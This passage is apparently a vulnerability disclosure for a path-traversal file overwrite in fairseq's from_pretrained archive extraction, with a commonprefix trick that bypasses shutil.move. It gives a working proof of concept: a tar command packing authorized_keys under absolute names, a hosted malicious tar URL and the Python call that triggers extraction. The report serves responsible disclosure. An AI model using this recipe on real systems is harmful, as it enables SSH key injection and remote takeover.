<p>and then it calls <a href="https://github.com/facebookresearch/fairseq/blob/bedb259bf34a9fc22073c13a1cee23192fa70ef3/fairseq/hub_utils.py#L23">hub_utils.from_pretrained</a>, in this function, it calls <a href="https://github.com/facebookresearch/fairseq/blob/bedb259bf34a9fc22073c13a1cee23192fa70ef3/fairseq/file_utils.py#L54">file_utils.load_archive_file</a> to download file from <code class="language-plaintext highlighter-rouge">model_name_or_path</code></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>def from_pretrained(
    model_name_or_path,
    checkpoint_file="model.pt",
    data_name_or_path=".",
    archive_map=None,
    **kwargs
):
    ...
    model_path = file_utils.load_archive_file(model_name_or_path)
</code></pre></div></div>

<p>in <code class="language-plaintext highlighter-rouge">file_utils.load_archive_file</code>, it calls <code class="language-plaintext highlighter-rouge">file_utils.cached_path</code> firstly:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>def load_archive_file(archive_file):
    # redirect to the cache, if necessary
    try:
        resolved_archive_file = cached_path(archive_file, cache_dir=None)
    except EnvironmentError:
        logger.info(
            "Archive name '{}' was not found in archive name list. "
            "We assumed '{}' was a path or URL but couldn't find any file "
            "associated to this path or URL.".format(
                archive_file,
                archive_file,
            )
        )
        return None

    if resolved_archive_file == archive_file:
        logger.info("loading archive file {}".format(archive_file))
    else:
        logger.info(
            "loading archive file {} from cache at {}".format(
                archive_file, resolved_archive_file
            )
        )

    # Extract archive to temp dir and replace .tar.bz2 if necessary
    tempdir = None
    if not os.path.isdir(resolved_archive_file):
        tempdir = tempfile.mkdtemp()
        logger.info(
            "extracting archive file {} to temp dir {}".format(
                resolved_archive_file, tempdir
            )
        )
        ext = os.path.splitext(archive_file)[1][1:]
        with tarfile.open(resolved_archive_file, "r:" + ext) as archive:
            top_dir = os.path.commonprefix(archive.getnames())
            archive.extractall(tempdir)
        os.remove(resolved_archive_file)
        shutil.move(os.path.join(tempdir, top_dir), resolved_archive_file)
        shutil.rmtree(tempdir)

    return resolved_archive_file
</code></pre></div></div>

<p>and then in <code class="language-plaintext highlighter-rouge">file_utils.cached_path</code>, when parmeter <code class="language-plaintext highlighter-rouge">url_or_filename</code> is an url, it calls <a href="https://github.com/facebookresearch/fairseq/blob/bedb259bf34a9fc22073c13a1cee23192fa70ef3/fairseq/file_utils.py#L279">file_utils.get_from_cache</a> to download tar file and save file content in temperary file and return the temperary file path to <code class="language-plaintext highlighter-rouge">file_utils.load_archive_file</code>.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>def get_from_cache(url, cache_dir=None):
    ...    
    cache_path = os.path.join(cache_dir, filename)
    if not os.path.exists(cache_path):
        # Download to temporary file, then copy to cache dir once finished.
        # Otherwise you get corrupt cache entries if the download gets interrupted.
        with tempfile.NamedTemporaryFile() as temp_file:
            logger.info("%s not found in cache, downloading to %s", url, temp_file.name)

            # GET file object
            if url.startswith("s3://"):
                s3_get(url, temp_file)
            else:
                ##### Download tar file from url!!!!! #####
                http_get(url, temp_file)

            # we are copying the file before closing it, so flush to avoid truncation
            temp_file.flush()
            # shutil.copyfileobj() starts at the current position, so go to the start
            temp_file.seek(0)
    ...
    return cache_path
</code></pre></div></div>

<p>Back to <code class="language-plaintext highlighter-rouge">file_utils.load_archive_file</code>, the malicious tar file is opened by <code class="language-plaintext highlighter-rouge">tarfile.open</code> and extracted by <code class="language-plaintext highlighter-rouge">archive.extractall</code> without any security checks which is well-known vulnerability. when tar file is compressed by <code class="language-plaintext highlighter-rouge">tar</code> option <code class="language-plaintext highlighter-rouge">--absolute-names</code>, absolute path names and relative path names can be included in tar file. When extracted by <code class="language-plaintext highlighter-rouge">tarfile.extractall</code>, the file with absolute names will overwrite target files silently, causing arbitrary file overwite.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>def load_archive_file(archive_file):
    ...
    # Extract archive to temp dir and replace .tar.bz2 if necessary
    tempdir = None
    if not os.path.isdir(resolved_archive_file):
        tempdir = tempfile.mkdtemp()
        logger.info(
            "extracting archive file {} to temp dir {}".format(
                resolved_archive_file, tempdir
            )
        )
        ext = os.path.splitext(archive_file)[1][1:]
        with tarfile.open(resolved_archive_file, "r:" + ext) as archive:
            top_dir = os.path.commonprefix(archive.getnames())
            archive.extractall(tempdir)
        os.remove(resolved_archive_file)
        shutil.move(os.path.join(tempdir, top_dir), resolved_archive_file)
        shutil.rmtree(tempdir)

    return resolved_archive_file
</code></pre></div></div>

<p>During the testing, I found the file to be overwrite is missing. By reading the source code carefully, it uses <code class="language-plaintext highlighter-rouge">shutil.move</code> to move files extracted to <code class="language-plaintext highlighter-rouge">resolved_archive_file</code> target. The move source is from <code class="language-plaintext highlighter-rouge">os.path.join(tempdir, top_dir)</code> and <code class="language-plaintext highlighter-rouge">top_dir</code> is from <code class="language-plaintext highlighter-rouge">os.path.commonprefix(archive.getnames())</code>. Well, this is controlled by attacker, in <a href="https://docs.python.org/3/library/os.path.html#os.path.commonprefix">Python documents</a>, when list contains both abs and relative pathnames, it will return empty string in which attacker can include abs and relative names in tar file, and then <code class="language-plaintext highlighter-rouge">move</code> source will be <code class="language-plaintext highlighter-rouge">tempdir</code> which bypass the <code class="language-plaintext highlighter-rouge">shutil.move</code>.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt; os.path.commonprefix(['/home/kali/.ssh/xx', '404.html'])
  ''
&gt; os.path.join("/root/tmp/","")
  '/root/tmp/'
</code></pre></div></div>

<h2 id="proof-of-concept">Proof of Concept</h2>

<p>An attacker can create a malicous tar file using following command:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tar --absolute-names -cvf hack.tar /home/kali/.ssh/authorized_keys 404.html
</code></pre></div></div>

<p>Then, the attacker will upload the <code class="language-plaintext highlighter-rouge">hack.tar</code> to public server.</p>

<p>I have uploaded one malicous tar file for testing: <a href="https://raw.githubusercontent.com/sunriseXu/onnx/main/validated/hack-abs-and-relative.tar">https://raw.githubusercontent.com/sunriseXu/onnx/main/validated/hack-abs-and-relative.tar</a></p>

<p>If anyone now downloads tar using <code class="language-plaintext highlighter-rouge">from_pretrained</code> api, causing automatically extracting the malicous tar file and overwrite files silently.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>from fairseq.models.transformer import TransformerModel
model = TransformerModel.from_pretrained('https://raw.githubusercontent.com/sunriseXu/onnx/main/validated/hack-abs-and-relative.tar')
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt; cat /home/kali/.ssh/authorized_keys
ssh-rsa xxx hacker@test.com
</code></pre></div></div>

<p>Tested on Google Colab: <a href="https://colab.research.google.com/drive/1AY9iqw_FdTvMGoqaDseX8jCnSGV9qCq6?usp=sharing">https://colab.research.google.com/drive/1AY9iqw_FdTvMGoqaDseX8jCnSGV9qCq6?usp=sharing</a></p>

<p><img src="https://live.staticflickr.com/65535/53639482085_b57cae8712_k.jpg" alt="poc" /></p>

<h2 id="impact">Impact</h2>

<p>This vulnerability can have severe consequences. This section will highlight some tangible impact.</p>

<h3 id="ssh-access">SSH Access</h3>

<p>On servers that have SSH enabled, an attacker may be able to inject their own public RSA key into the authorized_keys file, leading to remote code execution.</p>

<h3 id="web-servers">Web Servers</h3>

<p>On servers hosting web servers, various vulnerabilities can be exploited. On PHP or JSP server, remote code execution may be possible via uploading a webshell. On other servers an HTML file can be uploaded to achieve Cross-site Scripting (XSS)</p>

<h2 id="reference">Reference</h2>

<p><a href="https://huntr.com/bounties/5d7e5752-085c-4e93-af0d-e25f05a27b89">https://huntr.com/bounties/5d7e5752-085c-4e93-af0d-e25f05a27b89</a></p>

<h2 id="occurrences">Occurrences</h2>

<p><a href="https://github.com/facebookresearch/fairseq/blob/bedb259bf34a9fc22073c13a1cee23192fa70ef3/fairseq/file_utils.py#L90">https://github.com/facebookresearch/fairseq/blob/bedb259bf34a9fc22073c13a1cee23192fa70ef3/fairseq/file_utils.py#L90</a></p>]]></content><author><name></name></author><category term="file-overwrite" /><summary type="html"><![CDATA[Name]]></summary></entry></feed>